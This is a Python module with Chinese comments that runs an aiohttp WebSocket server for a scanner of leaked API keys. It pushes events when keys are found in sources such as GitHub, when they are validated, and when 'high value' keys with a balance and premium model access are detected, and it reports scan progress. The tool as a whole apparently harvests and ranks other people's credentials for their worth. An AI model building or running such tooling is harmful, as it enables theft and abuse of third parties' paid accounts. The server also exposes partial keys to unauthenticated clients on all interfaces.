"""
实时管道模块 - WebSocket实时通知

功能：
1. WebSocket服务器 - 实时推送扫描进度
2. 事件系统 - Key发现、验证完成、高价值Key告警
3. 多客户端支持 - 支持多个Dashboard同时连接
4. 心跳检测 - 自动断线重连
5. 事件过滤 - 按平台、状态、价值筛选

使用场景：
- Web Dashboard实时更新
- 移动端推送通知
- 监控系统集成
- 多人协作
"""

import asyncio
import json
from datetime import datetime
from typing import Set, Dict, Any, Optional
from dataclasses import dataclass, asdict
from enum import Enum

import aiohttp
from aiohttp import web, WSMsgType
from loguru import logger


class EventType(Enum):
    """事件类型"""
    KEY_FOUND = "key_found"              # Key发现
    KEY_VALIDATED = "key_validated"      # Key验证完成
    HIGH_VALUE_KEY = "high_value_key"    # 高价值Key
    SCAN_PROGRESS = "scan_progress"      # 扫描进度
    SCAN_COMPLETE = "scan_complete"      # 扫描完成
    ERROR = "error"                      # 错误事件
    HEARTBEAT = "heartbeat"              # 心跳


@dataclass
class RealtimeEvent:
    """实时事件数据模型"""
    event_type: str
    timestamp: str
    data: Dict[str, Any]

    def to_json(self) -> str:
        """转换为JSON字符串"""
        return json.dumps({
            'event_type': self.event_type,
            'timestamp': self.timestamp,
            'data': self.data
        }, ensure_ascii=False)


class RealtimeHub:
    """
    实时事件中心

    管理所有WebSocket连接和事件分发
    """

    def __init__(self):
        self.clients: Set[web.WebSocketResponse] = set()
        self.client_filters: Dict[web.WebSocketResponse, Dict] = {}
        self._lock = asyncio.Lock()
        self.stats = {
            'total_events': 0,
            'connected_clients': 0,
            'keys_found': 0,
            'keys_validated': 0,
            'high_value_keys': 0
        }

    async def register(self, ws: web.WebSocketResponse, filters: Optional[Dict] = None):
        """注册新客户端"""
        async with self._lock:
            self.clients.add(ws)
            self.client_filters[ws] = filters or {}
            self.stats['connected_clients'] = len(self.clients)
            logger.info(f"客户端已连接 (总数: {len(self.clients)})")

    async def unregister(self, ws: web.WebSocketResponse):
        """注销客户端"""
        async with self._lock:
            self.clients.discard(ws)
            self.client_filters.pop(ws, None)
            self.stats['connected_clients'] = len(self.clients)
            logger.info(f"客户端已断开 (总数: {len(self.clients)})")

    async def broadcast(self, event: RealtimeEvent):
        """广播事件到所有客户端"""
        if not self.clients:
            return

        async with self._lock:
            self.stats['total_events'] += 1

            # 更新统计
            if event.event_type == EventType.KEY_FOUND.value:
                self.stats['keys_found'] += 1
            elif event.event_type == EventType.KEY_VALIDATED.value:
                self.stats['keys_validated'] += 1
            elif event.event_type == EventType.HIGH_VALUE_KEY.value:
                self.stats['high_value_keys'] += 1

            # 发送到匹配的客户端
            dead_clients = set()
            for client in self.clients:
                if self._should_send(client, event):
                    try:
                        await client.send_str(event.to_json())
                    except Exception as e:
                        logger.warning(f"发送失败: {e}")
                        dead_clients.add(client)

            # 清理失效连接
            for client in dead_clients:
                await self.unregister(client)

    def _should_send(self, client: web.WebSocketResponse, event: RealtimeEvent) -> bool:
        """判断是否应该发送事件到客户端（基于过滤器）"""
        filters = self.client_filters.get(client, {})

        # 无过滤器，发送所有
        if not filters:
            return True

        # 平台过滤
        if 'platforms' in filters:
            platform = event.data.get('platform')
            if platform and platform not in filters['platforms']:
                return False

        # 事件类型过滤
        if 'event_types' in filters:
            if event.event_type not in filters['event_types']:
                return False

        # 仅高价值Key
        if filters.get('high_value_only'):
            if event.event_type != EventType.HIGH_VALUE_KEY.value:
                is_high_value = event.data.get('is_high_value', False)
                if not is_high_value:
                    return False

        return True

    async def emit_key_found(self, platform: str, api_key: str, source_url: str):
        """发送Key发现事件"""
        event = RealtimeEvent(
            event_type=EventType.KEY_FOUND.value,
            timestamp=datetime.now().isoformat(),
            data={
                'platform': platform,
                'api_key': api_key[:20] + '...',  # 截断显示
                'source_url': source_url
            }
        )
        await self.broadcast(event)

    async def emit_key_validated(
        self,
        platform: str,
        api_key: str,
        status: str,
        balance: float = 0.0,
        model_tier: str = "",
        value_score: int = 0,
        is_high_value: bool = False
    ):
        """发送Key验证完成事件"""
        event = RealtimeEvent(
            event_type=EventType.KEY_VALIDATED.value,
            timestamp=datetime.now().isoformat(),
            data={
                'platform': platform,
                'api_key': api_key[:20] + '...',
                'status': status,
                'balance': balance,
                'model_tier': model_tier,
                'value_score': value_score,
                'is_high_value': is_high_value
            }
        )
        await self.broadcast(event)

        # 高价值Key额外发送告警
        if is_high_value:
            await self.emit_high_value_key(platform, api_key, balance, model_tier, value_score)

    async def emit_high_value_key(
        self,
        platform: str,
        api_key: str,
        balance: float,
        model_tier: str,
        value_score: int
    ):
        """发送高价值Key告警"""
        event = RealtimeEvent(
            event_type=EventType.HIGH_VALUE_KEY.value,
            timestamp=datetime.now().isoformat(),
            data={
                'platform': platform,
                'api_key': api_key[:20] + '...',
                'balance': balance,
                'model_tier': model_tier,
                'value_score': value_score,
                'alert_level': 'critical' if value_score >= 80 else 'high'
            }
        )
        await self.broadcast(event)

    async def emit_scan_progress(
        self,
        scanned: int,
        total: int,
        keys_found: int,
        valid_keys: int
    ):
        """发送扫描进度"""
        event = RealtimeEvent(
            event_type=EventType.SCAN_PROGRESS.value,
            timestamp=datetime.now().isoformat(),
            data={
                'scanned': scanned,
                'total': total,
                'progress': round(scanned / total * 100, 2) if total > 0 else 0,
                'keys_found': keys_found,
                'valid_keys': valid_keys
            }
        )
        await self.broadcast(event)

    async def emit_scan_complete(
        self,
        total_scanned: int,
        keys_found: int,
        valid_keys: int,
        high_value_keys: int,
        duration: float
    ):
        """发送扫描完成事件"""
        event = RealtimeEvent(
            event_type=EventType.SCAN_COMPLETE.value,
            timestamp=datetime.now().isoformat(),
            data={
                'total_scanned': total_scanned,
                'keys_found': keys_found,
                'valid_keys': valid_keys,
                'high_value_keys': high_value_keys,
                'duration': duration,
                'keys_per_second': round(total_scanned / duration, 2) if duration > 0 else 0
            }
        )
        await self.broadcast(event)


# 全局实例
realtime_hub = RealtimeHub()


async def websocket_handler(request: web.Request) -> web.WebSocketResponse:
    """WebSocket连接处理器"""
    ws = web.WebSocketResponse(heartbeat=30)
    await ws.prepare(request)

    # 获取过滤器参数
    filters = {}
    if 'platforms' in request.query:
        filters['platforms'] = request.query['platforms'].split(',')
    if 'high_value_only' in request.query:
        filters['high_value_only'] = request.query['high_value_only'].lower() == 'true'

    await realtime_hub.register(ws, filters)

    try:
        # 发送欢迎消息和统计信息
        welcome = RealtimeEvent(
            event_type='connected',
            timestamp=datetime.now().isoformat(),
            data={
                'message': '已连接到实时管道',
                'stats': realtime_hub.stats
            }
        )
        await ws.send_str(welcome.to_json())

        # 心跳循环
        async for msg in ws:
            if msg.type == WSMsgType.TEXT:
                try:
                    data = json.loads(msg.data)

                    # 处理客户端命令
                    if data.get('command') == 'get_stats':
                        stats_event = RealtimeEvent(
                            event_type='stats',
                            timestamp=datetime.now().isoformat(),
                            data=realtime_hub.stats
                        )
                        await ws.send_str(stats_event.to_json())

                    elif data.get('command') == 'update_filters':
                        realtime_hub.client_filters[ws] = data.get('filters', {})
                        await ws.send_str(json.dumps({'status': 'filters_updated'}))

                except json.JSONDecodeError:
                    logger.warning(f"无效的JSON: {msg.data}")

            elif msg.type == WSMsgType.ERROR:
                logger.error(f"WebSocket错误: {ws.exception()}")

    finally:
        await realtime_hub.unregister(ws)

    return ws


async def stats_handler(request: web.Request) -> web.Response:
    """统计信息API"""
    return web.json_response(realtime_hub.stats)


def create_realtime_app() -> web.Application:
    """创建实时管道应用"""
    app = web.Application()
    app.router.add_get('/ws', websocket_handler)
    app.router.add_get('/api/realtime/stats', stats_handler)
    return app


async def start_realtime_server(host: str = '0.0.0.0', port: int = 8765):
    """启动实时管道服务器"""
    app = create_realtime_app()
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, host, port)
    await site.start()

    logger.success(f"🚀 实时管道服务器启动: ws://{host}:{port}/ws")

    # 保持运行
    try:
        await asyncio.Event().wait()
    finally:
        await runner.cleanup()


# 测试代码
async def test_realtime_pipeline():
    """测试实时管道"""
    print("=" * 70)
    print("实时管道测试")
    print("=" * 70)

    # 启动服务器（后台）
    server_task = asyncio.create_task(start_realtime_server(port=8765))
    await asyncio.sleep(1)  # 等待服务器启动

    # 模拟事件
    await realtime_hub.emit_key_found("openai", "sk-test-123", "https://github.com/test/repo")
    await realtime_hub.emit_key_validated("openai", "sk-test-123", "valid", 100.0, "GPT-4", 75, True)
    await realtime_hub.emit_scan_progress(50, 100, 10, 5)

    print("\n测试事件已发送")
    print(f"统计信息: {realtime_hub.stats}")

    # 取消服务器
    server_task.cancel()
    try:
        await server_task
    except asyncio.CancelledError:
        pass


if __name__ == "__main__":
    asyncio.run(test_realtime_pipeline())
